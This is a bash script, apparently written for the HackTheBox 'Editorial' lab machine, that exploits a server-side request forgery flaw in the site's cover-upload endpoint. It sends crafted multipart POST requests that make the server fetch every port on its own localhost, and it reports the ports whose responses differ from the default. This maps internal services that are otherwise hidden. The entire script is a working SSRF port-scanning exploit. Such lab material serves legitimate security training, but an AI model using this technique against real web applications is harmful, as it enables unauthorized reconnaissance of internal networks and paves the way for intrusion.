#!/bin/bash

function ctrl_c() {
  echo -e "\n\n[!] Saliendo..."
  tput cnorm; exit 1
}

trap ctrl_c INT

tput cvis
for port in $(seq 1 65535); do
  {
    url="http://127.0.0.1:$port"
    response=$(curl -s --compressed -X POST http://editorial.htb/upload-cover -H 'Host: editorial.htb' -H 'Content-Type: multipart/form-data; boundary=---------------------------3065595393976417060430481553' --data-binary $'-----------------------------3065595393976417060430481553\x0d\x0aContent-Disposition: form-data; name=\"bookurl\"\x0d\x0a\x0d\x0a'"$url"$'\x0d\x0a-----------------------------3065595393976417060430481553\x0d\x0aContent-Disposition: form-data; name=\"bookfile\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------3065595393976417060430481553--\x0d\x0a')

    if [ "$response" != "/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg" ] && [ "$response" != "" ]; then
      echo -e "[!] $port: $response"
    fi
  } &
done; wait
tput cnorm
